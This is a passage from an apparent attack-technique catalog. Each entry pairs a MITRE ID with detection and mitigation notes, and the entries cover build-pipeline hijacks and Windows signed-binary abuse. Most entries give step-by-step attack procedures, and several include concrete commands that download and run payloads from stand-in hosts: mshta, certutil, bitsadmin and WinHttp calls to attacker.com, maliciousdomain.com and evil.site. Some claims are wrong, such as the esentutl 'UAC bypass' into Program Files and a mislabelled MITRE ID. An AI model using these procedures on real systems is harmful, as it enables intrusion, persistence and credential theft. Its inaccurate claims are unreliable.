- **Tags**: #Obfuscation #StringSplit #MacroEvasion

## Malicious make Wrapper Dropped in Build Directory

- **Attack Type**: Build System Hijack
- **Target**: CI Pipelines, Dev Workstations
- **Vulnerability**: PATH poisoning, relative path hijack
- **MITRE**: T1059.004 (Unix Shell)
- **Impact**: Secret theft, covert data exfiltration, CI compromise
- **Tools**: Bash, chmod, make, Git
- **Scenario**: An attacker drops a malicious wrapper script named make into a developer's or CI build directory, hijacking the build process if the directory is high in the PATH or used via relative path.
- **Attack Steps**: 1. The attacker gains access to the CI server or a shared build volume where source code and scripts are stored.2. A malicious shell script named make is crafted to mimic the real tool but also sends environment variables and tokens to a remote server.3. The malicious make script is marked executable and added to the project root: chmod +x make.4. During build execution, CI scripts run ./make (relative path) or resolve it via a tampered $PATH, executing the malicious script instead of the system binary.5. The script executes data exfiltration and optionally runs the real make afterward to avoid detection.6. The CI pipeline completes with the attacker having stolen secrets or build context data silently.
- **Detection**: Monitor execution paths, alert on unknown binaries used in builds
- **Solution**: Restrict execution to known binary paths; digitally sign or verify build tools
- **Tags**: #ci #make #build-hijack #wrapper-script #path-hijack #exfiltration

## Compromised Pre-Commit Hook Pulls Obfuscated Backdoor at Build Time

- **Attack Type**: Pre-Build Hook Injection
- **Target**: Developer Laptops, Git Repos
- **Vulnerability**: Improper hook validation, local code trust
- **MITRE**: T1059.004 (Unix Shell)
- **Impact**: Supply chain contamination before commit
- **Tools**: Git, curl, base64, sh
- **Scenario**: An attacker modifies the .git/hooks/pre-commit script to fetch and execute a backdoor when developers commit code, thereby contaminating the source before it’s built or pushed.
- **Attack Steps**: 1. Attacker compromises a developer's system or a shared repo where hooks are committed (even though hooks are not versioned by default, some teams sync them via scripts).2. They insert a new .git/hooks/pre-commit shell script which base64-decodes and executes a malicious binary downloaded via curl.3. When the developer commits code, the script auto-runs, downloading a malicious payload (e.g., reverse shell or RAT).4. The hook injects a small piece of code into build files or source files, ensuring persistence in future builds.5. The developer is unaware, and the malicious code is now committed to the repo, affecting all downstream builds.
- **Detection**: File integrity checking, warn on unexpected hook file presence
- **Solution**: Enforce signed commits; audit .git/hooks; deny untrusted hook scripts on dev machines
- **Tags**: #git-hooks #precommit #buildstep #base64 #rat #injected-code

## Subverted Build Image Pulls Malware via Unpinned Docker Tags

- **Attack Type**: Image Tag Manipulation
- **Target**: Docker-based CI, Dev Containers
- **Vulnerability**: Use of mutable tags in base image references
- **MITRE**: T1609 (Container Admin Access)
- **Impact**: Stealthy CI compromise, secret theft, container poisoning
- **Tools**: Docker Hub, Bash, curl
- **Scenario**: A build process pulls a base image using an unpinned tag (e.g., latest), which the attacker has replaced with a malicious version containing malware or credential stealers.
- **Attack Steps**: 1. Developer or CI pipeline uses an unpinned image: FROM someorg/build-env:latest.2. The attacker gains control over the Docker Hub org or mirrors a similarly named public image under a typo or squatted name.3. The malicious image includes malware, such as a binary that exfiltrates ~/.aws/credentials, SSH keys, or environment variables.4. When the build runs, this malicious image is pulled silently because it matches the latest tag.5. The malware executes within the container during the build and may hide by cleaning logs or executing in memory.6. Build continues successfully, but secrets are now exfiltrated or further persistence is achieved via embedded cron jobs.
- **Detection**: Compare image digests; restrict builds to allowlisted hashes or trusted registries
- **Solution**: Pin image tags to immutable digests; scan build containers regularly; enforce private registries
- **Tags**: #docker #build-env #unpinned #latest-tag #container-hijack #malware #supplychain

## Dependency with Malicious prepare Script in package.json

- **Attack Type**: Malicious NPM Lifecycle Script
- **Target**: Node.js Developers, CI Tools
- **Vulnerability**: NPM lifecycle abuse
- **MITRE**: T1059.003 (JavaScript)
- **Impact**: Credential theft, local implant, repo tampering
- **Tools**: npm, Node.js, curl
- **Scenario**: A seemingly legitimate NPM package hides a malicious prepare script in its package.json, triggering execution during local development or CI builds.
- **Attack Steps**: 1. Attacker publishes an NPM library with useful functionality, but embeds a malicious prepare script in package.json.2. The script uses curl to download an additional payload and executes it.3. A developer or CI pipeline adds this package to the project and runs npm install.4. Since prepare runs after installation (especially in linked packages or from Git), the malicious code executes.5. The attacker’s payload may extract environment secrets, modify code, or implant persistence tools.6. Since the prepare step happens locally, antivirus tools may miss it, especially in CI environments with limited runtime monitoring.
- **Detection**: Monitor install hooks; scan package.json for unexpected scripts
- **Solution**: Disable lifecycle scripts in CI; use --ignore-scripts; pin and audit dependencies
- **Tags**: #npm #prepare #malware #lifecycle #build-abuse #supplychain

## Hijacked Python Build Backend with Compromised pyproject.toml

- **Attack Type**: Build Tool Injection
- **Target**: Python Projects, PyPI
- **Vulnerability**: Abuse of build backend specification in PEP 517
- **MITRE**: T1059.006 (Python)
- **Impact**: Arbitrary code execution, silent backdoor during install
- **Tools**: pip, Python, custom build backends
- **Scenario**: The attacker injects a malicious Python backend like custom_build in pyproject.toml, which executes arbitrary code during pip install or wheel builds.
- **Attack Steps**: 1. Attacker modifies or uploads a Python package with a pyproject.toml that specifies a custom backend: build-backend = "custom_build.hook".2. The custom_build module is designed to appear benign but contains code in hook.py that runs during the wheel build or install phase.3. When a developer installs the package via pip, it invokes the backend, which executes malicious Python code (e.g., uploads SSH keys, plants a reverse shell, or adds user accounts).4. Because this backend is declared in pyproject.toml, many developers overlook it as it's not inside typical setup.py or main logic.5. Attack completes with no indication unless deep inspection of the backend module occurs.
- **Detection**: Analyze pyproject.toml files; monitor for unknown backend modules
- **Solution**: Validate backend sources; use static analysis tools; pin versions to known-safe builds
- **Tags**: #python #pyproject #pep517 #malicious-backend #pip-install #supplychain

## Embedded gradlew Script Drops RAT During Android Build

- **Attack Type**: Scripted Build Tool Attack
- **Target**: Android Developers, CI
- **Vulnerability**: Malicious wrapper script bundled in source
- **MITRE**: T1204.002 (User Execution)
- **Impact**: Backdoor delivery, CI compromise, developer system takeover
- **Tools**: Gradle, curl, bash, Android SDK
- **Scenario**: A malicious gradlew wrapper script, included in an Android project, downloads and launches a remote access trojan (RAT) during CI builds or local development.
- **Attack Steps**: 1. Attacker forks a popular open-source Android project and replaces the gradlew wrapper with a modified version.2. The modified gradlew script looks identical but includes logic to curl a malicious binary and execute it during build.3. An unsuspecting developer or CI system clones the project and builds it using ./gradlew.4. The malicious binary is downloaded and executed, performing tasks like keystroke logging or credential scraping.5. Gradle build then continues, making the attack invisible.6. Because gradlew is commonly trusted and executed blindly, the attacker achieves reliable execution on every build.
- **Detection**: Monitor build script diffs; scan downloaded project wrappers; enable AV in build containers
- **Solution**: Do not trust 3rd-party gradlew scripts; enforce SHA checksum validation or self-built wrappers
- **Tags**: #android #gradlew #rat #ci-backdoor #script-hijack #supplychain

## Macro Extracts Payload from Image Pixel RGB Pattern

- **Attack Type**: Steganographic Payload
- **Target**: End Users
- **Vulnerability**: Image stego not flagged by AVs
- **MITRE**: T1027.003 – Steganography
- **Impact**: Script concealed inside visual data
- **Tools**: VBA, PowerShell, ImageMagick
- **Scenario**: Macro reads RGB values from an image to decode and reconstruct a PowerShell payload.
- **Attack Steps**: 1. Macro downloads a seemingly benign PNG/JPEG image.2. Uses a custom VBA loop to read pixel RGB values via LoadPicture or ActiveX image handler.3. Encoded script (e.g., PowerShell base64) is extracted using RGB mapping (e.g., red for binary 1, green for 0).4. Decoded content written to .ps1 and executed via Shell.5. Evades signature-based scanners by avoiding EXIF-based detection.
- **Detection**: Monitor image open + unexpected PowerShell use
- **Solution**: Disable image processing in macro environments
- **Tags**: #Stego #ImageRGB #VisualPayload

## Fake Antivirus Scan Prompt to Trick Macro Execution

- **Attack Type**: Social Engineering Trigger
- **Target**: Office Users
- **Vulnerability**: High trust in antivirus popups
- **MITRE**: T1204.002 – User Execution
- **Impact**: Trick user into executing malware
- **Tools**: VBA, MsgBox, PowerShell, GUI Tools
- **Scenario**: Macro simulates antivirus warning popup, asking users to run a fake scan that’s actually malware.
- **Attack Steps**: 1. Macro displays a pop-up: MsgBox("Suspicious activity detected. Run immediate scan?")2. On user confirmation, script launches powershell.exe to execute hidden malware.3. Message may show fake scan animation via GUI forms or splash windows.4. Social engineering exploits fear of malware to trick the user.5. May also auto-run after user click without visible script window.
- **Detection**: Monitor MsgBox abuse + PowerShell calls
- **Solution**: Block VBA macros from showing prompts
- **Tags**: #FakeAV #MacroTrick #SocialEngineering

## Macro Performs DCOM Object Hijack for Remote Execution

- **Attack Type**: DCOM Hijack
- **Target**: Internal Networks
- **Vulnerability**: Weak DCOM ACLs
- **MITRE**: T1175 – Component Object Model Hijacking
- **Impact**: Remote execution from Office macro
- **Tools**: VBA, DCOM, WMI, PowerShell
- **Scenario**: Macro abuses Distributed COM (DCOM) for remote code execution using Office and WMI.
- **Attack Steps**: 1. Macro initializes a DCOM object like "WbemScripting.SWbemLocator".2. Connects to WMI remotely: Set obj = locator.ConnectServer("remotehost", ...)3. Executes a script or drops payload via WMI’s Win32_Process.Create.4. If internal system trusts the caller, the payload runs silently.5. Helps bypass local logging by triggering remote execution.
- **Detection**: Audit remote COM/WMI calls from Office apps
- **Solution**: Restrict DCOM usage from Office environment
- **Tags**: #DCOM #RemoteExec #OfficeMacro

## Macro Launches HTA Script via mshta.exe Proxy

- **Attack Type**: LOLBin Proxy Execution
- **Target**: Enterprise Desktops
- **Vulnerability**: Overlooked use of mshta.exe
- **MITRE**: T1218.005 – Mshta
- **Impact**: Scripted payload via trusted binary
- **Tools**: VBA, mshta.exe, HTA, JavaScript
- **Scenario**: Macro abuses mshta.exe to launch a remote or local HTML application (HTA) with embedded code.
- **Attack Steps**: 1. Macro constructs a malicious .hta file with embedded JavaScript (e.g., ActiveX launching PowerShell).2. Writes the .hta to temp folder or fetches from attacker URL.3. Launches: Shell "mshta.exe http://attacker.com/payload.hta".4. HTA executes and drops payload (fileless or disk-based).5. Uses trusted LOLBin to bypass basic macro restrictions.
- **Detection**: Monitor mshta launches + macro linkages
- **Solution**: Block mshta.exe or restrict HTA usage
- **Tags**: #LOLBins #Mshta #HTAPayload

## Macro Uses WinHTTP COM Object to Pull Payload Silently

- **Attack Type**: COM Object Download
- **Target**: End Users
- **Vulnerability**: WinHttp object rarely monitored
- **MITRE**: T1105 – Ingress Tool Transfer
- **Impact**: Payload fetched via stealth COM methods
- **Tools**: VBA, WinHttp COM, PowerShell
- **Scenario**: Macro loads payload from attacker using WinHttp.WinHttpRequest.5.1 COM object for stealthy fetch.
- **Attack Steps**: 1. Macro creates object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")2. Sets up request: http.Open "GET", "http://evil.site/payload.ps1"3. Sends request and saves response to a local file.4. Executes with: Shell("powershell -ExecutionPolicy Bypass -File temp.ps1")5. Avoids WebClient or standard API detection by using COM interface directly.
- **Detection**: Alert on COM-based HTTP request from Office
- **Solution**: Disable WinHttp COM in macro contexts
- **Tags**: #COMHTTP #MacroFetch #SilentPayload

## Certutil Download & Decode Abuse

- **Attack Type**: File Download & Execution via Certutil
- **Target**: Endpoints
- **Vulnerability**: Insecure native tools allow external file downloads
- **MITRE**: T1105 – Ingress Tool Transfer
- **Impact**: Covert download and execution using trusted binary
- **Tools**: certutil.exe, Base64 file
- **Scenario**: Uses certutil.exe (a native Windows binary) to download and decode a remote payload, often base64-encoded, to evade traditional download protections.
- **Attack Steps**: 1. Attacker prepares a base64-encoded malicious executable and hosts it at http://attacker.com/payload.b64.2. On the victim system, the attacker runs: certutil -urlcache -split -f http://attacker.com/payload.b64 payload.b64 to fetch the file.3. Next, they decode it using: certutil -decode payload.b64 payload.exe to convert it into a usable binary.4. Once decoded, payload.exe can be executed using start payload.exe or any preferred method.5. Since certutil is a signed Windows binary and part of the OS, it often bypasses traditional download monitoring.6. This is frequently used in phishing payloads, or when establishing persistence or staging additional tools.
- **Detection**: Monitor command-line use of certutil and file decoding
- **Solution**: Block certutil via AppLocker or WDAC if unused
- **Tags**: #LOLBins #Certutil #Base64 #FileTransfer #LivingOffTheLand

## Bitsadmin Payload Staging

- **Attack Type**: Scheduled Download/Execution
- **Target**: Internal Hosts
- **Vulnerability**: Background Intelligent Transfer not properly monitored
- **MITRE**: T1197 – BITS Jobs
- **Impact**: Stealthy download with deferred execution
- **Tools**: bitsadmin.exe, Remote payload
- **Scenario**: Leverages bitsadmin.exe to create background file transfers and optionally execute after download.
- **Attack Steps**: 1. Attacker uploads a backdoor or stage-2 malware to a public URL like http://maliciousdomain.com/dropper.exe.2. On the victim host, they execute: bitsadmin /transfer myJob /download /priority high http://maliciousdomain.com/dropper.exe C:\Users\Public\dropper.exe.3. This uses the BITS service (normally used by Windows Update) to fetch the file in the background, making it stealthy.4. Once the file is downloaded, they may automate execution via scheduled task, login script, or follow-up command.5. Because bitsadmin is a trusted system binary, it’s often ignored by endpoint security and appears legitimate in logs.6. The downloaded payload can be combined with LOLBins like rundll32, mshta, or powershell for further stealth.
- **Detection**: Monitor BITS job creation and persistence flags
- **Solution**: Disable bitsadmin and monitor BITS usage in audit logs
- **Tags**: #LOLBins #BITS #Download #StealthExecution #Bitsadmin

## InstallUtil DLL Execution Abuse

- **Attack Type**: DLL Execution with Managed Code
- **Target**: Windows Systems
- **Vulnerability**: Abuses signed binaries to execute custom DLL logic
- **MITRE**: T1218.004 – InstallUtil
- **Impact**: Bypasses security controls to run unmanaged code
- **Tools**: installutil.exe, Malicious DLL
- **Scenario**: Uses InstallUtil.exe (meant for .NET assembly installation) to run custom code inside DLLs, often bypassing AV.
- **Attack Steps**: 1. Attacker writes a C# DLL with malicious code inside the public override void Uninstall(...) method.2. They compile the DLL using csc.exe, ensuring that the DLL exports proper installer methods.3. The DLL is hosted locally or on a remote share, e.g., \\attacker\payloads\evil.dll.4. On target, the attacker runs: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false evil.dll.5. This triggers execution of the Uninstall() method, running arbitrary attacker code.6. Because installutil is a signed binary from Microsoft and not flagged as suspicious by many AVs, this bypasses basic signature-based detection.7. No UAC prompt occurs unless elevated functionality is required.
- **Detection**: Monitor installutil invocation with command-line logging
- **Solution**: Block installutil.exe via application control tools
- **Tags**: #LOLBins #InstallUtil #Bypass #ManagedCode #Execution

## MSBuild XAML Task Execution

- **Attack Type**: Code Execution via XML Task Abuse
- **Target**: Developer Machines
- **Vulnerability**: Trust in MSBuild tools without inspection
- **MITRE**: T1127.001 – MSBuild
- **Impact**: Executes payloads via development tool
- **Tools**: msbuild.exe, Malicious .proj file
- **Scenario**: Abuses MSBuild.exe to execute C# code embedded in project files, exploiting its automation capabilities.
- **Attack Steps**: 1. Attacker writes a .proj XML file with embedded C# code inside a custom <UsingTask> block.2. The task defines code to execute on build — like launching reverse shells, downloading malware, etc.3. The attacker either drops this .proj file on the target or fetches it from a share like \\attacker\malicious.proj.4. The attacker runs msbuild.exe malicious.proj to trigger execution.5. MSBuild compiles and executes the embedded code using the .NET runtime.6. Because MSBuild is a legitimate build tool installed by default with Visual Studio or .NET, it avoids detection and blends into development environments.7. This technique is useful for executing payloads without writing new binaries or using PowerShell.
- **Detection**: Monitor MSBuild usage and inspect suspicious .proj files
- **Solution**: Restrict msbuild.exe via WDAC or remove if unused
- **Tags**: #LOLBins #MSBuild #ProjectAbuse #XAML #Execution

## Scriptrunner via Wscript or Cscript

- **Attack Type**: VBScript or JScript Execution
- **Target**: Enterprise Desktops
- **Vulnerability**: Native script engines often overlooked by defenders
- **MITRE**: T1059.005 – Visual Basic
- **Impact**: Executes attacker logic via trusted script engine
- **Tools**: wscript.exe, cscript.exe, .vbs/.js script
- **Scenario**: Executes attacker-controlled .vbs or .js scripts using Windows-native interpreters like wscript.exe or cscript.exe.
- **Attack Steps**: 1. Attacker writes a malicious VBScript (payload.vbs) that downloads and runs code, e.g., via XMLHTTP or Shell.Run methods.2. The script may be dropped via phishing, macro, or already present in a staging location.3. On the victim machine, the attacker executes it with: wscript payload.vbs or cscript payload.vbs.4. These interpreters run the script using Windows Scripting Host, which is often enabled by default.5. Scripts may also be embedded in scheduled tasks, login scripts, or triggered via LNK files.6. Since both wscript and cscript are signed Microsoft binaries, they commonly evade EDR and AV alerts unless behavior-based detection is enabled.7. This allows fileless, in-memory execution of commands or staged malware.
- **Detection**: Enable script block logging, AMSI, and restrict script host use
- **Solution**: Disable wscript/cscript where unnecessary or use AppLocker
- **Tags**: #LOLBins #WScript #CScript #VBScript #Fileless

## Hidden Scheduled Task via XML Import

- **Attack Type**: Scheduled Task Abuse
- **Target**: Endpoints, Servers
- **Vulnerability**: Abuse of trusted XML task structure
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistence with stealth
- **Tools**: schtasks.exe, XML file
- **Scenario**: Attacker creates a malicious XML task definition and imports it via schtasks.exe to silently persist with elevated privileges.
- **Attack Steps**: 1. The attacker first crafts a malicious XML file (hidden_task.xml) with a scheduled task that silently triggers PowerShell or other payloads under SYSTEM or a high-privilege user.2. The XML defines properties such as RunLevel set to HighestAvailable, triggers like OnStartup, and hidden visibility settings to avoid user detection.3. The attacker runs: schtasks /Create /XML hidden_task.xml /TN "MicrosoftUpdater" /RU "SYSTEM"4. The task is imported directly without writing a visible script or binary to disk.5. Because XML import doesn't show detailed command-line arguments, AV/EDR may miss malicious intent unless deeper parsing is done.6. The task silently runs the payload at every system startup.7. The attacker gains persistence and potentially privilege escalation, all using built-in tools.
- **Detection**: Monitor for new tasks created from XML
- **Solution**: Disable schtasks XML import or restrict SYSTEM task creation
- **Tags**: #LOLBins #schtasks #XMLPersistence #TaskAbuse

## Fake MSBuild Process via Renamed Binary

- **Attack Type**: Build Process Masquerading
- **Target**: Developer Systems, Jump Boxes
- **Vulnerability**: Trust in signed binaries without path validation
- **MITRE**: T1127.001 – MSBuild Execution
- **Impact**: Evasion and code execution
- **Tools**: msbuild.exe (renamed), .proj XML
- **Scenario**: Attacker copies msbuild.exe and renames it to evade EDR signature-based detection, then executes malicious code via a renamed binary.
- **Attack Steps**: 1. The attacker copies msbuild.exe from C:\Windows\Microsoft.NET\Framework64\... and saves it as svchost.exe or msb32.exe in a temporary directory.2. Creates a .proj file with a <UsingTask> block that embeds C# shellcode or a reverse shell.3. Executes the renamed binary like .\msb32.exe payload.proj — still runs like msbuild, but some EDRs may ignore it due to the unfamiliar name.4. The malicious code is compiled and executed in memory.5. Since the binary is signed by Microsoft and running under a new name, it may bypass basic allowlisting and avoid triggering standard msbuild alerts.6. Used often during lateral movement or C2 setups.
- **Detection**: Monitor child processes from msbuild-like binaries
- **Solution**: Use path-based allowlisting, block unsigned clones
- **Tags**: #LOLBins #MSBuild #RenamedBinary #DevBypass

## DLL Hijacking via InstallUtil in Temp Path

- **Attack Type**: InstallUtil Exploit
- **Target**: Workstations, Laptops
- **Vulnerability**: DLL execution through trusted .NET paths
- **MITRE**: T1218.004 – InstallUtil
- **Impact**: Stealthy execution of arbitrary DLLs
- **Tools**: InstallUtil.exe, Malicious DLL
- **Scenario**: Installs a malicious DLL in a writable path and invokes it using InstallUtil.exe, exploiting trust in system paths.
- **Attack Steps**: 1. Attacker writes a DLL with payload logic in the Uninstall() method of a public class derived from Installer.2. Saves the DLL in a writable directory such as %TEMP% or a fake app directory (C:\ProgramData\WinUpdate\payload.dll).3. Executes with: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\ProgramData\WinUpdate\payload.dll4. The DLL is executed silently as part of the uninstall routine.5. No installation occurs, no UI is shown, and logs are optional.6. InstallUtil is signed, and many environments allow it by default, making it a suitable LOLBin.7. May also bypass some EDRs if the DLL is obfuscated or packed.8. Cleanup can delete the DLL after execution to avoid forensics.
- **Detection**: Audit InstallUtil execution with DLL paths
- **Solution**: Block or restrict InstallUtil using AppLocker or SRP
- **Tags**: #InstallUtil #DotNetLOLBins #TempDLL #ExecutionAbuse

## Bitsadmin with Hidden Parameters for File Delivery

- **Attack Type**: File Transfer via Windows Utility
- **Target**: Windows Endpoints
- **Vulnerability**: Abuse of BITS download mechanism
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Stealthy malware delivery
- **Tools**: bitsadmin.exe
- **Scenario**: Uses bitsadmin.exe with hidden job names and stealthy transfer parameters to deliver malware.
- **Attack Steps**: 1. Attacker prepares malware payload on a public or compromised server (e.g., attacker.com/dropper.exe).2. Runs: bitsadmin /create /download JobX to initialize the job.3. Adds source: bitsadmin /addfile JobX http://attacker.com/dropper.exe C:\Users\Public\svchost.exe4. Starts job: bitsadmin /resume JobX — the file downloads silently in the background.5. No browser is involved, reducing visibility.6. On completion, attacker executes C:\Users\Public\svchost.exe via PowerShell or WMI.7. BITS can resume failed transfers, improving reliability for large payloads.8. Deletes job with: bitsadmin /cancel JobX or leaves it to auto-expire.9. Often ignored in detection because bitsadmin is a legitimate updater used by Windows.
- **Detection**: Alert on BITS file transfers from suspicious domains
- **Solution**: Block bitsadmin or proxy all HTTP traffic
- **Tags**: #LOLBins #Bitsadmin #FileTransfer #StealthDownload

## Mavinject via Task Scheduler Chain

- **Attack Type**: Process Injection Chain
- **Target**: Internal Workstations
- **Vulnerability**: Multi-LOLBins chained for stealth persistence
- **MITRE**: T1055.001 – Process Injection
- **Impact**: Persistence with minimal artifacts
- **Tools**: schtasks.exe, mavinject.exe, DLL
- **Scenario**: Combines schtasks and mavinject to persistently inject payloads into trusted processes post-boot.
- **Attack Steps**: 1. Attacker creates a malicious DLL (backdoor.dll) containing payload logic.2. Determines a commonly running process at login (e.g., explorer.exe) and extracts its PID using PowerShell.3. Writes a PowerShell script that waits 5–10 seconds after login and then runs mavinject.exe <PID> /INJECTRUNNING backdoor.dll.4. Wraps the PowerShell logic into a scheduled task via: schtasks /Create /SC ONLOGON /TN InjectMe /TR "powershell.exe -File inject.ps1"5. On user login, the script runs, identifies explorer.exe’s PID, and injects the DLL into it.6. This achieves stealthy persistence with the payload running inside a legitimate, signed process.7. Avoids writing EXEs or overt startup entries, making it harder to trace.8. Ideal for staging C2 beacons, keyloggers, or token stealers.
- **Detection**: Monitor scheduled tasks running mavinject
- **Solution**: Block mavinject or restrict scheduled task creation
- **Tags**: #LOLBins #Mavinject #ProcessHijack #ChainedAbuse

## Esentutl File Copy to Protected Path (Alternate)

- **Attack Type**: File System Manipulation
- **Target**: Workstations
- **Vulnerability**: Abuse of esentutl's unrestricted file copy function
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Bypasses UAC/file copy restrictions for protected folders
- **Tools**: esentutl.exe
- **Scenario**: Leverages esentutl.exe to move an attacker’s binary into a normally restricted or monitored directory, circumventing conventional file write permissions.
- **Attack Steps**: 1. First, create or download a custom backdoor or benign-appearing tool (e.g., evilcalc.exe).2. Ensure that the target destination is a protected directory (e.g., C:\Program Files\AppName\evilcalc.exe).3. Open a Command Prompt with minimal privileges (no need for admin or UAC elevation).4. Run the following command to copy the file using the database utility: esentutl.exe /y evilcalc.exe /d "C:\Program Files\AppName\evilcalc.exe"5. Observe that the file is successfully written, bypassing Windows Explorer and some group policy restrictions that prevent unauthorized file moves.6. Launch the binary from a trusted host process or by manipulating a shortcut (.lnk) in the Start Menu or taskbar.7. Since esentutl.exe is a signed Windows binary, most endpoint detection tools won't flag its use.8. Useful in scenarios where attackers want persistence or backdoor implant within application folders commonly whitelisted by admins.
- **Detection**: Audit command-line invocations of esentutl
- **Solution**: Monitor and restrict esentutl usage via AppLocker
- **Tags**: #LOLBins #Esentutl #UACBypass #FileInjection

## Forfiles-Based Command Trigger (Alternate)

- **Attack Type**: Task-based Code Execution
- **Target**: Admin Machines
- **Vulnerability**: forfiles.exe allows indirect arbitrary command execution
- **MITRE**: T1202 – Indirect Command Execution
- **Impact**: Payload triggered silently based on file pattern criteria
- **Tools**: forfiles.exe, cmd.exe
- **Scenario**: Uses forfiles.exe to conditionally execute payloads across a filesystem by checking file extensions or timestamps, allowing stealthy post-exploitation actions.
- **Attack Steps**: 1. Begin by creating a few decoy .log or .tmp files in a specific directory (e.g., C:\Temp\1.tmp, 2.tmp) that will be used to trigger your payload.2. Develop the payload — e.g., calc.exe, reverse_shell.exe, or a PowerShell stager stored locally.3. In a Command Prompt, craft and run the following command: forfiles /p "C:\Temp" /m *.tmp /c "cmd /c start calc.exe"4. This command searches for every .tmp file in C:\Temp and for each match, executes the specified command.5. Because forfiles.exe runs as a native Windows binary, EDRs might not alert unless command-line auditing is in place.6. The attacker can modify the /c section to obfuscate or encode commands using base64 or chained PowerShell invocations.7. This method is often embedded within batch jobs or scheduled tasks, allowing execution to occur as part of legitimate admin routines.8. A stealth variant involves writing the command to a .bat file first and calling it via forfiles, further blending in.
- **Detection**: Look for forfiles.exe in correlation with suspicious processes
- **Solution**: Limit usage of forfiles.exe to admin-only scopes
- **Tags**: #LOLBins #Forfiles #AutomationHijack #TaskAbuse

## HH.exe to Execute HTA Scripts (Alternate)

- **Attack Type**: HTML Help Exploitation
- **Target**: Any User
- **Vulnerability**: Unmonitored script execution via hh.exe
- **MITRE**: T1218.001 – Signed Binary Proxy Execution
- **Impact**: Runs scripts using trusted Windows GUI component
- **Tools**: hh.exe, HTA, VBScript
- **Scenario**: Uses hh.exe (HTML Help executable) to silently launch .hta or .html files embedded with malicious scripts, enabling signed binary proxy execution.
- **Attack Steps**: 1. Begin by creating an .hta file using VBScript or JScript that embeds the actual payload (e.g., reverse shell, downloader).2. Save the file as exploit.hta and place it in a temporary or inconspicuous location like C:\Users\Public\.3. The .hta file can include commands such as: Set WshShell = CreateObject("WScript.Shell") : WshShell.Run "calc.exe" or more complex logic to fetch and run remote payloads.4. From any user-level Command Prompt or script, execute: hh.exe C:\Users\Public\exploit.hta5. Because hh.exe is a signed and trusted Microsoft binary, it won’t typically be blocked by AppLocker or flagged by basic antivirus heuristics.6. The Help window will briefly appear, but the script executes silently in the background.7. This technique is often used during phishing payload chains or initial access via document-based lures.8. A variation includes disguising .hta files as legitimate .chm help content or embedding the payload inside HTML help popups that social engineer the victim.
- **Detection**: Monitor hh.exe usage, especially with .hta files
- **Solution**: Block hh.exe or enforce policy restrictions via AppLocker
- **Tags**: #LOLBins #HTA #hh #ScriptExecution #LivingOffLand

## Exploiting PresentationHost with XAML Execution Chain

- **Attack Type**: XAML Code Execution
- **Target**: Dev/Office Systems
- **Vulnerability**: Unusual use of trusted WPF handler
- **MITRE**: T1218 – Signed Binary Proxy Execution
- **Impact**: Executes arbitrary commands using graphical XAML interface
- **Tools**: PresentationHost.exe, PowerShell, XAML
- **Scenario**: Uses PresentationHost.exe to interpret a crafted XAML file with embedded system commands, executing PowerShell via WPF loading.
- **Attack Steps**: 1. Craft a .xaml file containing malicious <ObjectDataProvider> elements that reference System.Diagnostics.Process to spawn powershell.exe. 2. Embed base64-encoded PowerShell payload within the XAML. 3. Save the file as payload.xaml. 4. Launch it via PresentationHost.exe payload.xaml on the victim system. 5. The Windows Presentation Foundation (WPF) engine renders the XAML and triggers the ObjectDataProvider, spawning a PowerShell process. 6. Because PresentationHost is a trusted Windows binary, the attack may bypass application control policies.
- **Detection**: Monitor PresentationHost.exe with non-GUI files
- **Solution**: Restrict or block PresentationHost unless needed
- **Tags**: #LOLBins #WPF #XAMLExec #PresentationHost

## MSXSL-Based XML Execution with External Scripting

- **Attack Type**: Scripted XML Transform
- **Target**: Office/Legacy Systems
- **Vulnerability**: Abuse of XML/XSL transformation engine
- **MITRE**: T1220 – XSL Script Processing
- **Impact**: Script execution under XML transformation
- **Tools**: msxsl.exe, XML, XSL, VBScript
- **Scenario**: Abuses msxsl.exe to execute embedded VBScript or JScript from XML/XSL transform, leading to silent command execution.
- **Attack Steps**: 1. Create an XML file data.xml with dummy structure. 2. Craft a malicious .xsl transform file that includes a <ms:script> block with VBScript, calling CreateObject("WScript.Shell").Run("cmd /c calc.exe"). 3. Store both files on disk. 4. Run the command: msxsl.exe data.xml payload.xsl. 5. The transform is applied, and the embedded script block executes within the context of the trusted XML interpreter. 6. This attack works even if macros are disabled and is rarely blocked by default since msxsl.exe is an old but signed binary.
- **Detection**: Detect msxsl.exe use with script blocks
- **Solution**: Disable or restrict msxsl.exe usage
- **Tags**: #LOLBins #msxsl #XMLAbuse #XSLScript

## Malicious Control Panel CPL Payload via control.exe

- **Attack Type**: CPL DLL Execution
- **Target**: Endpoints
- **Vulnerability**: Dynamic loading of CPLs by signed binary
- **MITRE**: T1218.002 – Control Panel Items
- **Impact**: DLL-based code execution via GUI binary
- **Tools**: control.exe, custom DLL (.cpl)
- **Scenario**: Executes a malicious .cpl file through control.exe, triggering exported CPlApplet function in a disguised DLL.
- **Attack Steps**: 1. Develop a malicious DLL in C or C++ that exports a function named CPlApplet. 2. Inside the function, insert payload code such as WinExec("powershell -nop -w hidden -c Invoke-WebRequest ..."). 3. Rename the DLL to malicious.cpl. 4. Execute it via: control malicious.cpl. 5. The Control Panel binary loads the .cpl file and invokes the exported function. 6. Because control.exe is a trusted signed binary, this execution may evade typical user suspicion and some EDRs.
- **Detection**: Detect control.exe invoking unknown CPLs
- **Solution**: Block execution of custom .cpl files
- **Tags**: #LOLBins #ControlExe #CPLHijack #GUIExecution

## Using SyncAppvPublishingServer.vbs for Proxy PowerShell Execution

- **Attack Type**: Signed VBS Proxy Execution
- **Target**: Enterprise Systems
- **Vulnerability**: Blind trust in signed VBS execution
- **MITRE**: T1216 – Signed Script Proxy Execution
- **Impact**: Bypasses execution controls via signed script
- **Tools**: SyncAppvPublishingServer.vbs, PowerShell, wscript.exe
- **Scenario**: Abuses Microsoft's signed SyncAppvPublishingServer.vbs script to invoke attacker-controlled PowerShell commands.
